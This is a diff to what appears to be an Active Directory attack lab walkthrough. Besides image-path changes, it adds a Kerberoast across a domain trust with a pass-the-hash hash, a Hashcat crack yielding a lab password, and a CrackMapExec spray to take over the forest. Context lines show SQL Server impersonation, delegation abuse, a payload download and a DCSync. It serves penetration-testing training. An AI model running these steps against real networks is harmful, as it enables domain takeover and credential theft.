@@ -100,7 +100,7 @@ Richard is member of the following groups, nothing interesting there:
 
 The attributes of the user also doesn't show anything interesting:
 
-![](<../../../.gitbook/assets/image (15) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
 
 ### 3. Access SQL Server
 
@@ -146,7 +146,7 @@ crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
 crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn't sysadmin yet.
 
@@ -209,7 +209,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../.gitbook/assets/image (18) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1).png>)
 
 4\. We impersonated the user Developer but still aren't sysadmin. We can check for impersonation permissions agains with the same query:
 
@@ -714,7 +714,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
@@ -894,7 +894,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\u
 secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURITY -sam ~/adlab/share/SAM
 ```
 
-![](<../../../.gitbook/assets/image (18).png>)
+![](<../../../.gitbook/assets/image (18) (1).png>)
 
 6\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes using the computeraccount:
 
@@ -912,9 +912,34 @@ secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaa
 
 **Task: Check for interesting user attributes across the trust to `bank.local`.**
 
+1. Use these credentials with [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket and kerberoast accross the bidrectional external trust.
 
+```
+python3 /opt/impacket/examples/GetUserSPNs.py 'secure.local/Administrator' -dc-ip 10.0.0.2 -target-domain bank.local -hashes :a59cc2e81b2835c6b402634e584a8edc -outputfile kerberoast.txt
+```
 
-### 14. Take over Foresat
+![](<../../../.gitbook/assets/image (18).png>)
+
+2\. We retrieved one hash. Lets crack it with Hashcat.
+
+```
+.\hashcat.exe -a 0 -m 13100 .\kerberoast.txt .\wordlists\rockyou.txt -r .\rules\dive.rule
+```
+
+![](<../../../.gitbook/assets/image (21).png>)
+
+We successfully cracked the password of the user `sa_admin`, the password is `Welcome123456!`
+
+### 14. Take over Forest
 
 **Task: Take over the `bank.local` forest.**
 
+1. We can spray these credentials with CrackMapExec to check if we see a `Pwn3d!` on both of the Domain Controllers `dc01.bank.local` and  `dc02.amsterdam.bank.local`:
+
+```
+crackmapexec smb 10.0.0.2 10.0.0.3 -d bank.local -u sa_admin -p 'Welcome123456!'
+```
+
+![](<../../../.gitbook/assets/image (15).png>)
+
+We successfully owned all three the domains!
